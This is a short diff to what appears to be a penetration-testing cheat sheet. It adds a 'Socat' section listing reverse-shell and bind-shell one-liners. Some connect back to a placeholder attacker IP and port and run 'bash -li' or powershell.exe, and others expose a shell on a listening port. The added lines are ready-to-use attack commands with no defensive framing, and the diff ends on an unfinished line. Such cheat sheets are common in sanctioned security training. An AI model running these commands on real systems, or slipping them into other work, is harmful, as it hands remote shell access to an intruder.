@@ -918,4 +918,14 @@ change your terminal tty size:
 - ``` stty rows <number> ```
 - ``` stty cols <number> ```
 
+**Socat**
+Reverse Shells
+- ``` socat TCP-L:<port> - ``` linux or windows
+- ``` socat TCP:<LOCAL-IP>:<LOCAL-PORT> ``` ``` EXEC:powershell.exe,pipes ``` Windows
+- ``` socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li" ``` Linux
+
+Bind Shells
+- ``` socat TCP-L:<PORT> EXEC:"bash -li" ``` Linux
+- ``` socat TCP-L:<PORT> EXEC:powershell.exe,pipes ``` Windows
+- ``` 
 
